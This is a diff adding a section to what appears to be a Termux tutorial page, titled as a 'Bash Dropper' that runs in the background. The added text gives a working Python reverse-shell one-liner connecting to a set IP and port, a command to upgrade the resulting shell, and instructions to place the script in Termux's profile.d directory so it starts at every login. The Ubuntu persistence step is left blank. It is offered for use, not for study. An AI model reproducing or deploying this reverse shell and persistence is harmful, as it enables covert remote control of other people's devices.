@@ -22,4 +22,22 @@ Download the file, by clicking on it (do not wget specially for termux). Once yo
 <pre>unzip filename.zip</pre>
 <br /><br />
 Verify the auth tocken. For that you need to wath the video will be shared soon.
+<br />
+<h2>Bash Dropper file which runs in background</h2>
+Copy the text below and save it as run.sh or some other name. Change the ip port as shown in video.
+<pre>
+export RHOST="192.168.1.37";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' &
+</pre>
+<br />
+Start the listener in your host machine and execute the file run.sh to the terminal. It will start tunning in background. Even if you close the terminal it will keep running. This bash session will be more beautiful if you pace the command in the terminal after getting reverse connection.
+<pre>
+python -c 'import pty;pty.spawn("/bin/bash")'
+</pre>
+Want access with boot?
+<br /> Drop the file run.sh in the locations:
+
+<br /> For termux
+<pre> /data/data/com.termux/files/usr/etc/profile.d </pre>
+For Ubuntu and others ****
+<pre></pre>
 
